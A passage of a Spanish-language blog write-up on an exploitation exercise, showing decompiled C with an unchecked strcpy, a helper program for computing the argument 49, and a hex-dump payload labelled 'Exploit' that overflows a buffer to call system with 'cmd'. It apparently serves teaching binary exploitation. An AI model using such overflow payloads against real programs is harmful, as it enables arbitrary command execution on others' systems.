</span></span></span><span style="display:flex;"><span>  Stream <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;example.txt&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>Stream )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">imprimir</span>(<span style="color:#e6db74">&#34;No se puede leer el archivo bye bye </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// De stream copia 200 bytes a Buffer
</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fread</span>(Buffer, <span style="color:#ae81ff">200u</span>, <span style="color:#ae81ff">1u</span>, Stream);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// De buffer lo copia a Destination
</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>(Destination, Buffer);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Si hay un argumentos
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Transforma a entero el 2do argumento
</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// v12 tiene que valer 31 entonces.
</span></span></span><span style="display:flex;"><span>    v12 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system.
</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// v13 = system + 49
</span></span></span><span style="display:flex;"><span>    v13 <span style="color:#f92672">=</span> system <span style="color:#f92672">+</span> v12;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">check</span>(Destination, v13);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">imprimir</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Buffer[30] = Destination[254]
</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">imprimir</span>(<span style="color:#f92672">&amp;</span>Buffer[<span style="color:#ae81ff">30</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="con-este-código-me-dí-cuenta-que-tenía-que-pasarle-49-como-argumento">Con este código me dí cuenta que tenía que pasarle 49 como argumento:</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// a = 61
</span></span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 1 = 31
</span></span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;atoi(%s): %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,argv[<span style="color:#ae81ff">1</span>],<span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">1</span>]));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;argc: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,argc);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;a = 61, 1 = 31</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&#39;%c&#39;-&#39;1&#39;+atoi(%s): %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#39;a&#39;</span>,argv[<span style="color:#ae81ff">1</span>],a);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="exploit">Exploit</h4>
<pre tabindex="0"><code>00000000: 5151 5151 5151 5151 5151 5151 5151 5151  QQQQQQQQQQQQQQQQ
00000010: 5100 5151 5151 5151 5151 5151 5151 636d  Q.QQQQQQQQQQQQcm
00000020: 64                                       d
</code></pre><p>Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta &lsquo;1&rsquo; en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.</p>

</div>


      </div>
    </section>
  </section><script 
src="/quiz/quizdown.js">
</script>
<script 
src="/quiz/quizdownKatex.js">
</script>
<script 
src="/quiz/quizdownHighlight.js">
</script>
<script>quizdown.register(quizdownHighlight).register(quizdownKatex).init()</script> 
<footer class="footer">
  <div class="content has-text-centered">
    
    
    <p>
      
      <a class="" href="https://imlauera.github.io/index.xml" target="_blank">
        <span>
          RSS
        </span>
      </a>
      
      | <a href="https://imlauera.github.io" target="_blank">Andres Imlauer.</a> 

      
      
    </p>
    
  </div>




<script type="text/javascript"
  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
  </script>
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({ tex2jax: {inlineMath: [["$","$"],["\\(","\\)"]]} })
</script>
</footer>


</body>
</html>
